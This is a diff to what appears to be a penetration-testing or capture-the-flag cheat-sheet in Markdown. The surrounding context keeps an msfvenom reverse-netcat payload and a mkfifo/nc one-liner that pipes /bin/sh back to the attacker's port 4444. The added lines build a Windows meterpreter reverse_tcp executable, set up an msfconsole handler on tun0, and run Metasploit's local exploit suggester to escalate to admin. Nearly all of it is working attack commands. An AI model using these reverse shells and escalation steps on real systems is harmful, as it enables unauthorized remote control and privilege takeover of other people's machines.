@@ -34,3 +34,20 @@ msfvenom -p cmd/unix/reverse_netcat RHOST=tun0 RPORT=4444 R
 mkfifo /tmp/ipvquh; nc $LOCAL_IP 4444 0</tmp/ipvquh | /bin/sh >/tmp/ipvquh 2>&1; rm /tmp/ipvquh
 ```
 
+Create reverse shell payload, exploit user and escalate to admin:
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 --platform windows LHOST=$LOCAL_IP LPORT=4444 -f exe > shell.exe
+```
+
+```msfconsole
+use windows/x64/meterpreter/reverse_tcp
+use windows/meterpreter/reverse_tcp
+set LHOST tun0
+set LPORT 4444
+exploit
+use post/multi/recon/local_exploit_suggester
+set session 1
+run
+#don't forget to set new handler to tun0 and new port
+```
